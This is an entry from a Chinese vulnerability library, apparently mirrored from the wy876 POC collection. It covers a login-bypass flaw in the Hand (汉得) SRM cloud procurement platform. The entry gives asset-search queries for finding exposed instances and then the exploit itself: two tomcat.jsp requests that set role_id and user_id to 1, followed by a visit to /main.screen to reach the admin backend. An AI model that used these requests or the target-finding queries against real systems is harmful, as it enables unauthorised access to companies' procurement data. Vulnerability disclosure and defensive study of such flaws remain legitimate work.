---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 汉得SRM tomcat.jsp 登录绕过漏洞

# 一、漏洞简介
汉得SRM云是面向企业采购流程信息化建设的完整解决方案。基于汉得供应商关系管理体系在战略寻源与集中采购、供应链协同和优益采购三大采购管理领域的成功实践，形成了深度契合业务实体的三项组件级解决方案。汉得SRM tomcat.jsp 存在登录绕过漏洞，可绕过身份认证登录后台。

# 二、影响版本
+ 汉得 SRM云平台（Going-Link）

# 三、资产测绘
+ hunter：`app.name="汉得 SRM Going-Link"`


+ 登录页面


# 四、漏洞复现
1. 访问`tomct.jsp`

```java
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```


2. 然后访问后台`<font style="color:rgba(0, 0, 0, 0.9);">/main.screen</font>`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kb4n0lalk008g50l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
